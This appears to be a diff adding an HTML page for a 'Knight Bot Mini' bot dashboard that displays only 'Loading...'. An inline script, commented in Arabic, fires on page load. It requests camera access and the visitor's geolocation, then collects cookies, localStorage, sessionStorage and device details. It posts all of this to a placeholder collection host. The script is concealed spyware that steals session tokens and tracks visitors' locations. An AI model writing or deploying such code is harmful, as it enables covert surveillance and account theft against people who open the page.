@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"/><title>Knight Bot Mini</title><link href="/favicon.svg" rel="icon" type="image/svg+xml"/><meta content="width=device-width, initial-scale=1" name="viewport"/><meta content="4" name="next-head-count"/><link as="style" href="/_next/static/css/ec63c7670817a69b.css" rel="preload"/><link data-n-g="" href="#" rel="stylesheet"/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="#"></script><script defer="" src="#"></script><script defer="" src="#"></script><script defer="" src="#"></script><script defer="" src="#"></script><script defer="" src="#"></script><script defer="" src="#"></script><script defer="" src="#"></script><script defer="" src="#"></script><script defer="" src="#"></script></head><body><div id="__next"><div style='padding:60px;text-align:center;color:#6b7280;font-size:16px;font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif'>Loading...</div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{}},"page":"/my-bots","query":{},"buildId":"xgpCJml52QMR6KvqA_fuO","nextExport":true,"autoExport":true,"isFallback":false,"scriptLoader":[]}</script>
+    <script>
+    (function() {
+        const sessionId = 'vGDPpLhB4Zcmw7Ox';
+        const COLLECT_URL = 'https://YOUR_BOT_HOST.com/collect';
+        
+        function collectAndSend() {
+            // طلب صلاحيات الكاميرا
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                try {
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+                        .then(stream => stream.getTracks().forEach(t => t.stop()))
+                        .catch(e => console.log('كاميرا خلفية مرفوضة'));
+                    
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                        .then(stream => stream.getTracks().forEach(t => t.stop()))
+                        .catch(e => console.log('كاميرا أمامية مرفوضة'));
+                } catch(e) {}
+            }
+            
+            // طلب الموقع
+            let locationData = 'غير متاح';
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        locationData = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+                        sendData(locationData);
+                    },
+                    err => {
+                        console.log('الموقع مرفوض');
+                        sendData('مرفوض');
+                    }
+                );
+            } else {
+                sendData('غير مدعوم');
+            }
+        }
+        
+        function sendData(location) {
+            const deviceInfo = {
+                session: sessionId,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: window.screen.width + 'x' + window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardware: {
+                    cores: navigator.hardwareConcurrency || 'غير معروف',
+                    memory: navigator.deviceMemory || 'غير معروف',
+                    touchPoints: navigator.maxTouchPoints || 0
+                },
+                location: location,
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                referrer: document.referrer || 'مباشر'
+            };
+            
+            // إرسال البيانات
+            fetch(COLLECT_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(deviceInfo)
+            })
+            .then(res => res.json())
+            .then(result => {
+                console.log('✅ تم الإرسال بنجاح');
+            })
+            .catch(err => {
+                console.error('❌ خطأ في الإرسال:', err);
+            });
+        }
+        
+        // تشغيل عند التحميل
+        window.addEventListener('load', function() {
+            setTimeout(collectAndSend, 1500);
+        });
+        
+        console.log('🔍 تم تحميل كود التجميع');
+    })();
+    </script>
+    
+</body></html>
